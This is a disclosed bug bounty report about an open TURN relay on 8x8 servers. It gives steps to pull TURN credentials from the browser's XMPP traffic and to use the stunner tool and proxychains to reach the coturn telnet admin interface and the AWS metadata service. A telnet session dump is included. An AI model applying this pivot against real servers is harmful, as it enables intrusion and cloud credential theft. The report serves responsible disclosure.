# Open TURN relay abuse is possible due to lack of peer access control (Critical)

## Report Details
- **Report ID**: 843256
- **URL**: https://hackerone.com/reports/843256
- **State**: Closed
- **Severity**: high
- **Submitted**: 2020-04-08T14:42:53.762Z
- **Disclosed**: 2020-06-08T21:36:26.131Z

## Reporter
- **Username**: sandrogauci
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: 8x8-bounty

## Vulnerability Information
> NOTE: This is not an SSRF vulnerability but an open TURN relay vulnerability. Typically, this security vulnerability has at least the same impact as an SSRF. However it is considered more useful from an attacker's point of view since attacks are not restricted to HTTP.

- Affects: 
    - `█████:443`
    - `████████:443`

## Description

The affected TURN server did not put any restrictions on peer which allows remote attackers to bypass firewall rules and reach internal services on the server itself as well as the AWS internal network. In the case of `██████████:443`, both TCP and UDP peers could be specified, while `███████:443` appeared to restrict TCP and only allow UDP.

## Steps To Reproduce:

1. Retrieved temporary TURN credentials from XMPP by:
    - making use of Chrome's devtools 
    - open the network tab, filter just WS connections
    - in the `xmpp-websocket` messages, set a filter for `type='turn'`
    - observe the TURN hostname and credentials
2. Made use of an internal tool called `stunner` as follows: `stunner recon tls://███████:443 -u ████████`
3. Made use of stunner's port scanner and socks proxy to reach the telnet server, AWS meta-data service and so on

Note that we restricted our tests to just the following to avoid causing denial of service to the system:

- Read access to AWS meta-data service
- Only running `help` and `pc` commands on coturn telnet server (other commands may be destructive)

The following is an excerpt from the connection to the coturn telnet server:


```
proxychains -f config telnet 127.0.0.1 5766
[proxychains] config file found: config
[proxychains] preloading /usr/lib64/proxychains-ng/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.13
Trying 127.0.0.1...
[proxychains] Dynamic chain  ...  127.0.0.1:9999  ...  127.0.0.1:5766  ...  OK
Connected to 127.0.0.1.
Escape character is '^]'.

> pc

  verbose: ON
  daemon process: ON
  stale-nonce: ON (*)
  stun-only: OFF (*)
  no-stun: OFF (*)
  secure-stun: OFF (*)
  do-not-use-config-file: OFF
  RFC5780 support: ON
  net engine version: 3
  net engine: UDP thread per CPU core
  enforce fingerprints: OFF
  mobility: OFF (*)
  udp-self-balance: OFF
  pidfile: /var/run/turnserver.pid
  process user ID: 0
  process group ID: 0
  process dir: /

  cipher-list: DEFAULT
  ec-curve-name: empty
  DH-key-length: 1066
  Certificate Authority file: empty
  Certificate file: /████████.crt
  Private Key file: /███.key
  Listener addr: 127.0.0.1
  Listener addr: ██████
  Listener addr: ::1
  Listener addr: ███████
  no-udp: OFF
  no-tcp: OFF
  no-dtls: OFF
  no-tls: OFF
  TLSv1.0: ON
    TLSv1.1: ON
  TLSv1.2: ON
  listener-port: 443
  tls-listener-port: 5349
  alt-listener-port: 0
  alt-tls-listener-port: 0


  Relay addr: █████
  Relay addr: ██████████
  server-relay: OFF
  no-udp-relay: OFF (*)
  no-tcp-relay: OFF (*)
  min-port: 49152
  max-port: 65535
  no-multicast-peers: OFF (*)
  no-loopback-peers: OFF (*)

  DB type: SQLite
  DB: /var/lib/turn/turndb

  Default realm: █████
  CLI session realm: █████
...

> q
```

## Supporting Material/References:

- Similar vulnerability: <https://www.rtcsec.com/2020/04/01-slack-webrtc-turn-compromise>

## Impact

Abuse of this vulnerability allows attackers to:

- control Coturn by connecting to the telnet server on port 5766 which in turn, allows for writing of files on disk (e.g. using `psd` command), display and editing of the coturn configuration, stopping the server
- connecting to the AWS meta-data service and retrieving IAM credentials for user `HipChatVideo-Coturn`, viewing user-data configuration etc
- scanning `127.0.0.1` and internal network on `██████` and connecting to internal services

Note that in the case of `██████████:443`, both TCP and UDP peers can be specified, while `███:443` appeared to be restricted to just UDP which somewhat limits the security impact of this vulnerability.

We think that it is likely that abuse of the coturn telnet server could lead to remote code execution on the server and further penetration inside 8x8's infrastructure.

## Attachments
No attachments
